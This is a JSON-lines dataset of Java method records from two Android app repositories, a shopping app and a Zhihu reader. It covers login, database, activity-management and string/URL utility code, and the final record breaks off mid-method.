{"docstring": "/**\n * \u624b\u673a\u53f7\u8f93\u5165\u662f\u5426\u6b63\u786e\n * @param phoneNumber\n * @return\n */\n", "func_signal": "public static boolean isPhoneNumber(String phoneNumber)", "code": "{\n    if (TextUtils.isEmpty(phoneNumber)) {\n        return false;\n    }\n    if (!phoneNumber.matches(\"^[0-9]*$\")) {\n        Log.i(TAG, \"isPhoneNumber: match error--\"+phoneNumber);\n        return false;\n    }\n    if (phoneNumber.length() != 11) {\n        Log.i(TAG, \"isPhoneNumber: length error--\"+phoneNumber);\n        return false;\n    }\n    if (phoneNumber.indexOf(0) == '1') {\n        Log.i(TAG, \"isPhoneNumber: start error--\"+phoneNumber);\n        return false;\n    }\n    return true;\n}", "path": "app\\src\\main\\java\\com\\myxh\\coolshopping\\util\\LoginHelperUtil.java", "repo_name": "myxh/CoolShopping", "stars": 926, "license": "None", "language": "java", "size": 46568}
{"docstring": "/**\n * \u63d2\u5165\u6570\u636e\n * @param model\n * @return\n */\n", "func_signal": "public static<T extends BaseModel> boolean insertData(T model)", "code": "{\n    final boolean[] isSuccess = {false};\n    model.save(new SaveListener<String>() {\n        @Override\n        public void done(String s, BmobException e) {\n            if (e == null) {\n                isSuccess[0] = true;\n            } else {\n                isSuccess[0] = false;\n            }\n        }\n    });\n    return isSuccess[0];\n}", "path": "app\\src\\main\\java\\com\\myxh\\coolshopping\\common\\BmobManager.java", "repo_name": "myxh/CoolShopping", "stars": 926, "license": "None", "language": "java", "size": 46568}
{"docstring": "/**\n * \u7ed3\u675f\u6240\u6709Activity\n */\n", "func_signal": "public void finishAllActivity()", "code": "{\n    for (int i = 0; i < activityStack.size(); i++) {\n        if (null != activityStack.get(i)) {\n            activityStack.get(i).finish();\n        }\n    }\n}", "path": "app\\src\\main\\java\\com\\myxh\\coolshopping\\common\\AppManager.java", "repo_name": "myxh/CoolShopping", "stars": 926, "license": "None", "language": "java", "size": 46568}
{"docstring": "/**\n * \u67e5\u8be2\u6211\u7684\u6536\u85cf\n * @param queryKey\n * @param queryValue\n */\n", "func_signal": "public void queryFavorData(String queryKey, Object queryValue)", "code": "{\n    BmobQuery<FavorModel> query = new BmobQuery<>();\n    query.addWhereEqualTo(queryKey,queryValue);\n    query.findObjects(new FindListener<FavorModel>() {\n        @Override\n        public void done(List<FavorModel> list, BmobException e) {\n            if (e == null) {\n                if (mListener != null) {\n                    mListener.onQuerySuccess(list);\n                }\n            } else {\n                if (mListener != null) {\n                    mListener.onQueryFailure(e);\n                }\n            }\n        }\n    });\n}", "path": "app\\src\\main\\java\\com\\myxh\\coolshopping\\common\\BmobManager.java", "repo_name": "myxh/CoolShopping", "stars": 926, "license": "None", "language": "java", "size": 46568}
{"docstring": "/**\n * \u66f4\u65b0\u6570\u636e\n * @param model\n * @return\n */\n", "func_signal": "public static<T extends BaseModel> boolean updateData(T model)", "code": "{\n    final boolean[] isSuccess = {false};\n    model.update(model.getObjectId(), new UpdateListener() {\n        @Override\n        public void done(BmobException e) {\n            if (e == null) {\n                isSuccess[0] = true;\n            } else {\n                isSuccess[0] = false;\n            }\n        }\n    });\n    return isSuccess[0];\n}", "path": "app\\src\\main\\java\\com\\myxh\\coolshopping\\common\\BmobManager.java", "repo_name": "myxh/CoolShopping", "stars": 926, "license": "None", "language": "java", "size": 46568}
{"docstring": "/**\n * \u590d\u5236\u6570\u636e\u5e93\u5230/data/data/com.myxh.coolshopping/databases/\n * @throws IOException\n */\n", "func_signal": "private void copyDataBase() throws IOException", "code": "{\n    InputStream inputStream = mContext.getAssets().open(\"cities.db\");\n    String filename = DB_PATH + DB_NAME;\n    OutputStream outputStream = new FileOutputStream(filename);\n    byte[] buffer = new byte[1024];\n    int length;\n    while ((length=inputStream.read(buffer)) > 0) {\n        outputStream.write(buffer,0,length);\n    }\n    Log.e(TAG, \"copyDataBase: \u590d\u5236\u6570\u636e\u5e93\u5b8c\u6210\");\n    outputStream.flush();\n    outputStream.close();\n    inputStream.close();\n}", "path": "app\\src\\main\\java\\com\\myxh\\coolshopping\\dao\\AllCityDbHelper.java", "repo_name": "myxh/CoolShopping", "stars": 926, "license": "None", "language": "java", "size": 46568}
{"docstring": "/**\n * \u4f7f\u7528\u7528\u6237\u540d\u5bc6\u7801\u767b\u5f55\n * @param username\n * @param password\n */\n", "func_signal": "public void login(String username, String password)", "code": "{\n    User user = new User();\n    user.setUsername(username);\n    user.setPassword(password);\n    user.login(new SaveListener<User>() {\n        @Override\n        public void done(User user, BmobException e) {\n            if (e==null) {\n                mListener.onLoginSuccess();\n            } else {\n                mListener.onLoginFailure();\n            }\n        }\n    });\n}", "path": "app\\src\\main\\java\\com\\myxh\\coolshopping\\common\\BmobManager.java", "repo_name": "myxh/CoolShopping", "stars": 926, "license": "None", "language": "java", "size": 46568}
{"docstring": "/**\n * \u7528\u6237\u6ce8\u518c\n * @param phoneNumber\n * @param code\n * @param password\n */\n", "func_signal": "public void signUp(String phoneNumber, String code, String password)", "code": "{\n    User user = new User();\n    user.setMobilePhoneNumber(phoneNumber);\n    user.setUsername(phoneNumber);\n    user.setPassword(password);\n    user.setSex(\"\u7537\");\n    user.signOrLogin(code, new SaveListener<User>() {\n        @Override\n        public void done(User user, BmobException e) {\n            if (e == null) {\n                mListener.onSignUpSuccess(user);\n            } else {\n                mListener.onSignUpFailure(e);\n            }\n        }\n    });\n}", "path": "app\\src\\main\\java\\com\\myxh\\coolshopping\\common\\BmobManager.java", "repo_name": "myxh/CoolShopping", "stars": 926, "license": "None", "language": "java", "size": 46568}
{"docstring": "/**\n * \u67e5\u8be2\u6570\u636e\n * @param queryKey\n * @param queryValue\n */\n", "func_signal": "public<U extends BaseModel> void queryData(String queryKey, Object queryValue)", "code": "{\n    BmobQuery<U> query = new BmobQuery<>();\n//        Log.i(TAG, \"queryData: T---------\"+model.getClass().getSimpleName());\n    query.addWhereEqualTo(queryKey,queryValue);\n    query.findObjects(new FindListener<U>() {\n        @Override\n        public void done(List<U> list, BmobException e) {\n            if (e == null) {\n                if (mListener != null) {\n                    mListener.onQuerySuccess(list);\n                }\n            } else {\n                if (mListener != null) {\n                    mListener.onQueryFailure(e);\n                }\n            }\n        }\n    });\n}", "path": "app\\src\\main\\java\\com\\myxh\\coolshopping\\common\\BmobManager.java", "repo_name": "myxh/CoolShopping", "stars": 926, "license": "None", "language": "java", "size": 46568}
{"docstring": "/**\n * \u83b7\u53d6\u5f53\u524dActivity\n */\n", "func_signal": "public Activity getCurrentActivity()", "code": "{\n    Activity activity = activityStack.lastElement();\n    return activity;\n}", "path": "app\\src\\main\\java\\com\\myxh\\coolshopping\\common\\AppManager.java", "repo_name": "myxh/CoolShopping", "stars": 926, "license": "None", "language": "java", "size": 46568}
{"docstring": "/**\n * \u5b89\u88c5Bmob\u652f\u4ed8\u63d2\u4ef6\n * @param fileName\n */\n", "func_signal": "public void installBmobPayPlugin(String fileName)", "code": "{\n    try {\n        InputStream is = getAssets().open(fileName);\n        File file = new File(Environment.getExternalStorageDirectory()\n                + File.separator + fileName + \".apk\");\n        if (file.exists())\n            file.delete();\n        file.createNewFile();\n        FileOutputStream fos = new FileOutputStream(file);\n        byte[] temp = new byte[1024];\n        int i = 0;\n        while ((i = is.read(temp)) > 0) {\n            fos.write(temp, 0, i);\n        }\n        fos.close();\n        is.close();\n\n        Intent intent = new Intent(Intent.ACTION_VIEW);\n        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);\n        intent.setDataAndType(Uri.parse(\"file://\" + file),\n                \"application/vnd.android.package-archive\");\n        startActivity(intent);\n    } catch (Exception e) {\n        e.printStackTrace();\n    }\n}", "path": "app\\src\\main\\java\\com\\myxh\\coolshopping\\common\\CoolApplication.java", "repo_name": "myxh/CoolShopping", "stars": 926, "license": "None", "language": "java", "size": 46568}
{"docstring": "/**\n * \u9a8c\u8bc1\u7801\u8f93\u5165\u662f\u5426\u6b63\u786e\n * @param code\n * @return\n */\n", "func_signal": "public static boolean isCodeCorrect(String code)", "code": "{\n    if (TextUtils.isEmpty(code)) {\n        return false;\n    }\n    if (!code.matches(\"^[0-9]*$\")) {\n        return false;\n    }\n    return true;\n}", "path": "app\\src\\main\\java\\com\\myxh\\coolshopping\\util\\LoginHelperUtil.java", "repo_name": "myxh/CoolShopping", "stars": 926, "license": "None", "language": "java", "size": 46568}
{"docstring": "/**\n * \u83b7\u53d6AppManager\u5355\u4f8b\n */\n", "func_signal": "public static AppManager getInstance()", "code": "{\n    if(instance == null) {\n        synchronized (AppManager.class) {\n            if (instance == null)\n                instance = new AppManager();\n        }\n    }\n    return instance;\n}", "path": "app\\src\\main\\java\\com\\myxh\\coolshopping\\common\\AppManager.java", "repo_name": "myxh/CoolShopping", "stars": 926, "license": "None", "language": "java", "size": 46568}
{"docstring": "/**\n * \u5220\u9664\u6570\u636e\n * @param model\n * @return\n */\n", "func_signal": "public static<T extends BaseModel> boolean deleteData(T model)", "code": "{\n    final boolean[] isSuccess = {false};\n    model.delete(new UpdateListener() {\n        @Override\n        public void done(BmobException e) {\n            if (e == null) {\n                isSuccess[0] = true;\n            } else {\n                isSuccess[0] = false;\n            }\n        }\n    });\n    return isSuccess[0];\n}", "path": "app\\src\\main\\java\\com\\myxh\\coolshopping\\common\\BmobManager.java", "repo_name": "myxh/CoolShopping", "stars": 926, "license": "None", "language": "java", "size": 46568}
{"docstring": "/** \u5c55\u793a\u7f16\u8f91\u754c\u9762*/\n", "func_signal": "protected void showEditPage(Context context, Platform platform, ShareParams sp)", "code": "{\n\tEditPage page;\n\tint orientation = context.getResources().getConfiguration().orientation;\n\tif (orientation == Configuration.ORIENTATION_PORTRAIT) {\n\t\tpage = new EditPagePort(this);\n\t} else {\n\t\tpage = new EditPageLand(this);\n\t}\n\tpage.setPlatform(platform);\n\tpage.setShareParams(sp);\n\tpage.show(context, null);\n}", "path": "app\\src\\main\\java\\cn\\sharesdk\\onekeyshare\\themes\\classic\\ClassicTheme.java", "repo_name": "myxh/CoolShopping", "stars": 926, "license": "None", "language": "java", "size": 46568}
{"docstring": "/**\n * \u68c0\u67e5\u6570\u636e\u5e93\u662f\u5426\u5b58\u5728\n * @return\n */\n", "func_signal": "public boolean checkDataBase()", "code": "{\n    SQLiteDatabase checkDB = null;\n    String dbPath = DB_PATH + DB_NAME;\n    try {\n        checkDB = SQLiteDatabase.openDatabase(dbPath,null,SQLiteDatabase.OPEN_READONLY);\n    } catch (SQLiteException e) {\n        e.printStackTrace();\n    } finally {\n        if (checkDB != null) {\n            checkDB.close();\n        }\n    }\n    return checkDB!=null ? true : false;\n}", "path": "app\\src\\main\\java\\com\\myxh\\coolshopping\\dao\\AllCityDbHelper.java", "repo_name": "myxh/CoolShopping", "stars": 926, "license": "None", "language": "java", "size": 46568}
{"docstring": "/**\n * \u624b\u673a\u9a8c\u8bc1\u7801\u4e00\u952e\u767b\u5f55\n * @param phoneNumber\n * @param code\n */\n", "func_signal": "public void loginByMsgCode(String phoneNumber, String code)", "code": "{\n    BmobUser.loginBySMSCode(phoneNumber, code, new LogInListener<User>() {\n        @Override\n        public void done(User user, BmobException e) {\n            if (user != null) {\n                if (mListener != null) {\n                    mListener.onLoginSuccess();\n                }\n            } else {\n                if (mListener != null) {\n                    mListener.onLoginFailure();\n                }\n            }\n        }\n    });\n}", "path": "app\\src\\main\\java\\com\\myxh\\coolshopping\\common\\BmobManager.java", "repo_name": "myxh/CoolShopping", "stars": 926, "license": "None", "language": "java", "size": 46568}
{"docstring": "/**\n * \u521d\u59cb\u5316Bmob\u652f\u4ed8\n */\n", "func_signal": "private void initPay()", "code": "{\n    BP.init(this,AppConstant.BMOB_AppID);\n    int pluginVersion = BP.getPluginVersion();\n    if (pluginVersion < PLUGINVERSION) {// \u4e3a0\u8bf4\u660e\u672a\u5b89\u88c5\u652f\u4ed8\u63d2\u4ef6, \u5426\u5219\u5c31\u662f\u652f\u4ed8\u63d2\u4ef6\u7684\u7248\u672c\u4f4e\u4e8e\u5b98\u65b9\u6700\u65b0\u7248\n        ToastUtil.show(this,\n                pluginVersion == 0 ? getString(R.string.plugin_not_installed)\n                        : getString(R.string.plugin_not_latest));\n        installBmobPayPlugin(AppConstant.PAY_PLUGIN_NAME);\n    }\n}", "path": "app\\src\\main\\java\\com\\myxh\\coolshopping\\common\\CoolApplication.java", "repo_name": "myxh/CoolShopping", "stars": 926, "license": "None", "language": "java", "size": 46568}
{"docstring": "/**\n * \u7ed3\u675f\u6307\u5b9aActivity\n */\n", "func_signal": "public void finishActivity(Activity activity)", "code": "{\n    if (activity != null) {\n        activityStack.remove(activity);\n        activity.finish();\n        activity = null;\n    }\n}", "path": "app\\src\\main\\java\\com\\myxh\\coolshopping\\common\\AppManager.java", "repo_name": "myxh/CoolShopping", "stars": 926, "license": "None", "language": "java", "size": 46568}
{"docstring": "/**\n * \u624b\u673a\u9a8c\u8bc1\u7801\u4e00\u952e\u6ce8\u518c\u6216\u767b\u5f55\n * @param phoneNumber\n * @param code\n */\n", "func_signal": "public void signOrLoginByMsgCode(String phoneNumber, String code)", "code": "{\n    BmobUser.signOrLoginByMobilePhone(phoneNumber, code, new LogInListener<User>() {\n        @Override\n        public void done(User user, BmobException e) {\n            if(user!=null){\n                if (mListener != null) {\n                    mListener.onLoginSuccess();\n                }\n            } else {\n                if (mListener != null) {\n                    mListener.onLoginFailure();\n                }\n            }\n        }\n    });\n}", "path": "app\\src\\main\\java\\com\\myxh\\coolshopping\\common\\BmobManager.java", "repo_name": "myxh/CoolShopping", "stars": 926, "license": "None", "language": "java", "size": 46568}
{"docstring": "/**\n * convert Long array to long array\n * \n * @param source\n * @return\n */\n", "func_signal": "public static long[] transformLongArray(Long[] source)", "code": "{\n    long[] destin = new long[source.length];\n    for (int i = 0; i < source.length; i++) {\n        destin[i] = source[i];\n    }\n    return destin;\n}", "path": "src\\com\\cundong\\izhihu\\util\\ObjectUtils.java", "repo_name": "cundong/ZhihuPaper", "stars": 936, "license": "None", "language": "java", "size": 15952}
{"docstring": "/**\n * \u6e05\u9664\u5b57\u7b26\u4e32\u672b\u5c3e\u7684\u7279\u5b9a\u5b57\u7b26<br>\n * \u82e5\u5b57\u7b26\u4e32\u672b\u5c3e\u5e76\u975e\u7ed9\u5b9a\u5b57\u7b26\uff0c\u5219\u4ec0\u4e48\u90fd\u4e0d\u505a<br>\n * \u6ce8\u610f\uff1a\u8be5\u65b9\u6cd5\u6539\u53d8\u4e86\u4f20\u5165\u7684StringBuffer\u53c2\u6570\u7684\u503c\n * \n * @param sb\n *            \u5b57\u7b26\u4e32\u7f13\u5b58\n * @param tail\n *            \u7528\u6237\u7ed9\u5b9a\u5b57\u7b26\n * @return \u5b57\u7b26\u4e32\u7f13\u5b58\u5bf9\u8c61\u7684\u5b57\u7b26\u4e32\u8868\u793a\n */\n", "func_signal": "public static String trimTail(StringBuffer sb, char tail)", "code": "{\n\tif (sb.length() > 0 && sb.charAt(sb.length() - 1) == tail)\n\t\tsb.deleteCharAt(sb.length() - 1);\n\treturn sb.toString();\n}", "path": "src\\com\\cundong\\izhihu\\util\\StringUtils.java", "repo_name": "cundong/ZhihuPaper", "stars": 936, "license": "None", "language": "java", "size": 15952}
{"docstring": "/**\n * \u5b57\u7b26\u4e32\u7684\u8f6c\u4e49(\u5904\u7406\u7279\u6b8a\u5b57\u7b26)\n * \n * @param input\n * @return\n */\n", "func_signal": "public static String StringToString(String input)", "code": "{\n\tStringBuilder sb = new StringBuilder();\n\tfor (int i = 0; i < input.length(); i++) {\n\t\tchar c = input.toCharArray()[i];\n\t\tswitch (c) {\n\t\tcase '\\'':\n\t\t\tsb.append(\"\\\\\\'\");\n\t\t\tbreak;\n\t\tcase '\\\"':\n\t\t\tsb.append(\"\\\\\\\"\");\n\t\t\tbreak;\n\t\tcase '\\\\':\n\t\t\tsb.append(\"\\\\\\\\\");\n\t\t\tbreak;\n\t\tcase '/':\n\t\t\tsb.append(\"\\\\/\");\n\t\t\tbreak;\n\t\tcase '\\b':\n\t\t\tsb.append(\"\\\\b\");\n\t\t\tbreak;\n\t\tcase '\\f':\n\t\t\tsb.append(\"\\\\f\");\n\t\t\tbreak;\n\t\tcase '\\n':\n\t\t\tsb.append(\"\\\\n\");\n\t\t\tbreak;\n\t\tcase '\\r':\n\t\t\tsb.append(\"\\\\r\");\n\t\t\tbreak;\n\t\tcase '\\t':\n\t\t\tsb.append(\"\\\\t\");\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tsb.append(c);\n\t\t\tbreak;\n\t\t}\n\t}\n\treturn sb.toString();\n}", "path": "src\\com\\cundong\\izhihu\\util\\StringUtils.java", "repo_name": "cundong/ZhihuPaper", "stars": 936, "license": "None", "language": "java", "size": 15952}
{"docstring": "/**\n * \u89e3\u6790\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5f97\u5230BaseEntity\u5bf9\u8c61\n * \n * @param content\n * @param clazz\n * @return\n */\n", "func_signal": "public static BaseEntity getEntity(String content, Class<?> clazz)", "code": "{\n\n\tif (TextUtils.isEmpty(content))\n\t\treturn null;\n\n\tGson gson = new Gson();\n\t\n\ttry {\n\t\tBaseEntity baseEntity = (BaseEntity) gson.fromJson(content, clazz);\n\t\treturn baseEntity;\n\t} catch (Exception e) {\n\t\te.printStackTrace();\n\t}\n\n\treturn null;\n}", "path": "src\\com\\cundong\\izhihu\\util\\GsonUtils.java", "repo_name": "cundong/ZhihuPaper", "stars": 936, "license": "None", "language": "java", "size": 15952}
{"docstring": "/**\n * \u5224\u65ad\u7ed9\u5b9a\u5b57\u7b26\u4e32\u662f\u5426\u7a7a\u767d\u4e32\u3002<br>\n * \u7a7a\u767d\u4e32\u662f\u6307\u7531\u7a7a\u683c\u3001\u5236\u8868\u7b26\u3001\u56de\u8f66\u7b26\u3001\u6362\u884c\u7b26\u7ec4\u6210\u7684\u5b57\u7b26\u4e32<br>\n * \u82e5\u8f93\u5165\u5b57\u7b26\u4e32\u4e3anull\u6216\u7a7a\u5b57\u7b26\u4e32\uff0c\u8fd4\u56detrue\n * \n * @param input\n * @return boolean\n */\n", "func_signal": "public static boolean isBlank(String input)", "code": "{\n\tif (input == null || \"\".equals(input))\n\t\treturn true;\n\n\tfor (int i = 0; i < input.length(); i++) {\n\t\tchar c = input.charAt(i);\n\t\tif (c != ' ' && c != '\\t' && c != '\\r' && c != '\\n') {\n\t\t\treturn false;\n\t\t}\n\t}\n\treturn true;\n}", "path": "src\\com\\cundong\\izhihu\\util\\StringUtils.java", "repo_name": "cundong/ZhihuPaper", "stars": 936, "license": "None", "language": "java", "size": 15952}
{"docstring": "/**\n * convert Integer array to int array\n * \n * @param source\n * @return\n */\n", "func_signal": "public static int[] transformIntArray(Integer[] source)", "code": "{\n    int[] destin = new int[source.length];\n    for (int i = 0; i < source.length; i++) {\n        destin[i] = source[i];\n    }\n    return destin;\n}", "path": "src\\com\\cundong\\izhihu\\util\\ObjectUtils.java", "repo_name": "cundong/ZhihuPaper", "stars": 936, "license": "None", "language": "java", "size": 15952}
{"docstring": "/**\n * \u5c06\u56fe\u7247\u4fdd\u5b58\u81f3\u7cfb\u7edf\u56fe\u5e93\n * \n * @param context\n * @param imagePath\n * @return\n */\n", "func_signal": "private boolean saveImage2Gallery(Context context, String imagePath)", "code": "{\n\t\n\tboolean result = true;\n\t\n    try {\n    \t// \u63d2\u5165\u5230\u7cfb\u7edf\u56fe\u5e93\n        MediaStore.Images.Media.insertImage(context.getContentResolver(), imagePath, \"title\", \"desc..\");\n        \n        // \u901a\u77e5\u56fe\u5e93\u66f4\u65b0\n\t    context.sendBroadcast(new Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE, Uri.parse(\"file://\" + imagePath)));\n    } catch (FileNotFoundException e) {\n        e.printStackTrace();\n        \n        result = false;\n    }\n    \n    return result;\n}", "path": "src\\com\\cundong\\izhihu\\task\\ImageToGalleryTask.java", "repo_name": "cundong/ZhihuPaper", "stars": 936, "license": "None", "language": "java", "size": 15952}
{"docstring": "/**\n * \u5c06Key-value\u8f6c\u6362\u6210\u7528&\u53f7\u94fe\u63a5\u7684URL\u67e5\u8be2\u53c2\u6570\u5f62\u5f0f\u3002\n * \n * @param parameters\n * @return\n */\n", "func_signal": "public static String encodeUrl(Bundle parameters)", "code": "{\n\tif (parameters == null) {\n\t\treturn \"\";\n\t}\n\tArrayList<String> list = new ArrayList<String>();\n\tStringBuilder sb = new StringBuilder();\n\tboolean first = true;\n\tfor (String key : parameters.keySet()) {\n\t\tlist.add(key);\n\t}\n\tCollections.sort(list);\n\tfor (String key : list) {\n\t\tif (first)\n\t\t\tfirst = false;\n\t\telse\n\t\t\tsb.append(\"&\");\n\t\tif (parameters.getString(key) != null) {\n\t\t\ttry {\n\t\t\t\tsb.append(URLEncoder.encode(key, \"UTF-8\") + \"=\" + URLEncoder.encode(parameters.getString(key), \"UTF-8\"));\n\t\t\t} catch (UnsupportedEncodingException e) {\n\t\t\t\te.printStackTrace();\n\t\t\t}\n\t\t}\n\t}\n\n\treturn sb.toString();\n}", "path": "src\\com\\cundong\\izhihu\\http\\UrlUtils.java", "repo_name": "cundong/ZhihuPaper", "stars": 936, "license": "None", "language": "java", "size": 15952}
{"docstring": "/**\n * list \u8f6c\u6362\u4e3a string\n * \n * @param list\n * @param flag\n * @return\n */\n", "func_signal": "public static String listToString(ArrayList<String> list, String flag)", "code": "{\n\tString strMsg = \"\";\n\tint listSize = list.size();\n\tif (listSize > 0) {\n\t\tfor (int i = 0; i < listSize; i++) {\n\t\t\tif (i == listSize - 1) {\n\t\t\t\tstrMsg = strMsg + list.get(i).toString();\n\t\t\t} else {\n\t\t\t\tstrMsg = strMsg + list.get(i).toString() + flag;\n\t\t\t}\n\t\t}\n\t} else {\n\t\tstrMsg = \"\";\n\t}\n\treturn strMsg;\n}", "path": "src\\com\\cundong\\izhihu\\util\\StringUtils.java", "repo_name": "cundong/ZhihuPaper", "stars": 936, "license": "None", "language": "java", "size": 15952}
{"docstring": "/**\n * \u5b57\u7b26\u4e32\u8f6c\u6362\u4e3aarraylist(\u5fc5\u987b\u7b26\u5408\u8fd9\u6837\u7684\u683c\u5f0f([{\"a\":\"a\",\"b\":\"b\"}\uff0c{\"a\":\"a\",\"b\":\"b\"}\uff0c{}]))\n * \n * @param strList\n * @return (\u6210\u529f\u4e3a arrayList \u5931\u8d25 Exception)\n * \n */\n", "func_signal": "public static ArrayList<Object> strToList(String strList)", "code": "{\n\n\tJSONObject oJsonObj = null;\n\tArrayList<Object> listStr = new ArrayList<Object>();\n\tint iStriList = strList.length(); // \u957f\u5ea6\n\tString strDemoList = strList.substring(1, iStriList - 1);// \u5e72\u6389 []\n\tString[] arrInfo = StringUtils.split(strDemoList, \"}", "path": "src\\com\\cundong\\izhihu\\util\\StringUtils.java", "repo_name": "cundong/ZhihuPaper", "stars": 936, "license": "None", "language": "java", "size": 15952}
{"docstring": "/**\n * InputStream\u8f6c\u4e3a\u5b57\u7b26\u4e32\n * \n * @param in\n * @return\n */\n", "func_signal": "public static String toString(InputStream in) throws IOException", "code": "{\n\tStringBuffer out = new StringBuffer();\n\tbyte[] buffer = new byte[1024];\n\tfor (int i; (i = in.read(buffer)) != -1;) {\n\t\tout.append(new String(buffer, 0, i));\n\t}\n\treturn out.toString();\n}", "path": "src\\com\\cundong\\izhihu\\util\\StringUtils.java", "repo_name": "cundong/ZhihuPaper", "stars": 936, "license": "None", "language": "java", "size": 15952}
{"docstring": "/**\n * convert long array to Long array\n * \n * @param source\n * @return\n */\n", "func_signal": "public static Long[] transformLongArray(long[] source)", "code": "{\n    Long[] destin = new Long[source.length];\n    for (int i = 0; i < source.length; i++) {\n        destin[i] = source[i];\n    }\n    return destin;\n}", "path": "src\\com\\cundong\\izhihu\\util\\ObjectUtils.java", "repo_name": "cundong/ZhihuPaper", "stars": 936, "license": "None", "language": "java", "size": 15952}
{"docstring": "/**\n * \u6839\u636e\u6307\u5b9a\u5206\u9694\u7b26\u5206\u5272\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u7ed3\u679c\u6570\u7ec4\u3002<br>\n * \u5904\u7406\u89c4\u5219\uff1a<br>\n * \u82e5\u8f93\u5165\u4e3anull\uff0c\u5219\u8fd4\u56denull\uff1b<br>\n * \u5426\u5219\u82e5\u8f93\u5165\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff0c\u5219\u8fd4\u56de\u7a7a\u6570\u7ec4\uff1b<br>\n * \u5426\u5219\u82e5\u5206\u9694\u7b26\u4e3anull\u6216\u7a7a\u5b57\u7b26\u4e32\uff0c\u5219\u8fd4\u56de\u5305\u542b\u539f\u5b57\u7b26\u4e32\u672c\u8eab\u7684\u6570\u7ec4\uff1b<br>\n * \u6ce8\u610f\uff1a\u8fd4\u56de\u7ed3\u679c\u4e2d\u8fc7\u6ee4\u6389\u7a7a\u5b57\u7b26\u4e32\n * \n * @param input\n *            \u8f93\u5165\u5b57\u7b26\u4e32(\u6570\u5b57\u5b57\u7b26\u4e32)\n * @param separator\n *            \u5206\u9694\u7b26\n * @return \u7ed3\u679c\u6570\u7ec4\uff08\u6ce8\u610f\uff1a\u4e0d\u5305\u62ec\u7a7a\u5b57\u7b26\u4e32\uff09\n */\n", "func_signal": "public static Integer[] splitInt(String input, String separator)", "code": "{\n\tif (input == null)\n\t\treturn null;\n\tif (input.equals(\"\"))\n\t\treturn null;\n\tif (separator == null || \"\".equals(separator))\n\t\treturn null;\n\n\tint cursor = 0; // \u6e38\u6807\n\tint lastPos = 0; // \u6307\u5411\u4e0a\u4e00\u4e2a\u5206\u9694\u7b26\u540e\u7b2c\u4e00\u4e2a\u5b57\u7b26\n\tArrayList<Integer> list = new ArrayList<Integer>();\n\n\twhile ((cursor = input.indexOf(separator, cursor)) != -1) {\n\n\t\tif (cursor > lastPos) {// \u6ee4\u6389\u7a7a\u5b57\u7b26\u4e32\n\t\t\tint token = Integer.parseInt(input.substring(lastPos, cursor));\n\t\t\tlist.add(token);\n\t\t}\n\n\t\tlastPos = cursor + separator.length();\n\n\t\tcursor = lastPos;\n\t}\n\n\tif (lastPos < input.length())\n\t\tlist.add(Integer.parseInt(input.substring(lastPos)));\n\n\tInteger[] iStrToI = new Integer[list.size()];\n\tfor (int i = 0; i < list.size(); i++) {\n\t\tiStrToI[i] = Integer.parseInt(list.get(i).toString());\n\t}\n\treturn iStrToI;\n}", "path": "src\\com\\cundong\\izhihu\\util\\StringUtils.java", "repo_name": "cundong/ZhihuPaper", "stars": 936, "license": "None", "language": "java", "size": 15952}
{"docstring": "/**\n * \u5b57\u7b26\u4e32\u66ff\u6362\n * \n * @param source\n * @param oldstring\n * @param newstring\n * @param caseInsensive\n * @return\n */\n", "func_signal": "public static String replaceString(String source, String oldstring, String newstring, boolean caseInsensive)", "code": "{\n\tMatcher matcher = null;\n\n\t// \u533a\u5206\u5927\u5c0f\u5199\n\tif (caseInsensive) {\n\t\tmatcher = Pattern.compile(oldstring, Pattern.CASE_INSENSITIVE).matcher(source);\n\t} else {\n\t\tmatcher = Pattern.compile(oldstring).matcher(source);\n\t}\n\n\treturn matcher.replaceAll(newstring);\n}", "path": "src\\com\\cundong\\izhihu\\util\\StringUtils.java", "repo_name": "cundong/ZhihuPaper", "stars": 936, "license": "None", "language": "java", "size": 15952}
{"docstring": "/**\n * \u5c06\u7528&\u53f7\u94fe\u63a5\u7684URL\u53c2\u6570\u8f6c\u6362\u6210key-value\u5f62\u5f0f\u3002\n * \n * @param s\n * @return\n */\n", "func_signal": "public static Bundle decodeUrl(String s)", "code": "{\n\tBundle params = new Bundle();\n\tif (s != null) {\n\t\tString array[] = s.split(\"&\");\n\t\tfor (String parameter : array) {\n\t\t\tString[] paramArr = parameter.split(\"=\");\n\t\t\tif(paramArr!=null&&paramArr.length==2){\n\t\t\t\ttry {\n\t\t\t\t\tparams.putString(URLDecoder.decode(paramArr[0], \"UTF-8\"), URLDecoder.decode(paramArr[1], \"UTF-8\"));\n\t\t\t\t} catch (UnsupportedEncodingException e) {\n\t\t\t\t\te.printStackTrace();\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\treturn params;\n}", "path": "src\\com\\cundong\\izhihu\\http\\UrlUtils.java", "repo_name": "cundong/ZhihuPaper", "stars": 936, "license": "None", "language": "java", "size": 15952}
{"docstring": "/**\n * \u6839\u636e\u6307\u5b9a\u5206\u9694\u7b26\u5206\u5272\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u7ed3\u679c\u6570\u7ec4\u3002<br>\n * \u5904\u7406\u89c4\u5219\uff1a<br>\n * \u82e5\u8f93\u5165\u4e3anull\uff0c\u5219\u8fd4\u56denull\uff1b<br>\n * \u5426\u5219\u82e5\u8f93\u5165\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff0c\u5219\u8fd4\u56de\u7a7a\u6570\u7ec4\uff1b<br>\n * \u5426\u5219\u82e5\u5206\u9694\u7b26\u4e3anull\u6216\u7a7a\u5b57\u7b26\u4e32\uff0c\u5219\u8fd4\u56de\u5305\u542b\u539f\u5b57\u7b26\u4e32\u672c\u8eab\u7684\u6570\u7ec4\uff1b<br>\n * \n * @param input\n *            \u8f93\u5165\u5b57\u7b26\u4e32\n * @param separator\n *            \u5206\u9694\u7b26\n * @return \u7ed3\u679c\u6570\u7ec4\uff08\u6ce8\u610f\uff1a\u5305\u62ec\u7a7a\u5b57\u7b26\u4e32\uff09\n */\n", "func_signal": "public static String[] split(String input, String separator)", "code": "{\n\tif (input == null)\n\t\treturn null;\n\tif (input.equals(\"\"))\n\t\treturn EMPTY_STRING;\n\tif (separator == null || \"\".equals(separator))\n\t\treturn new String[] { input };\n\n\tint cursor = 0; // \u6e38\u6807\n\tint lastPos = 0; // 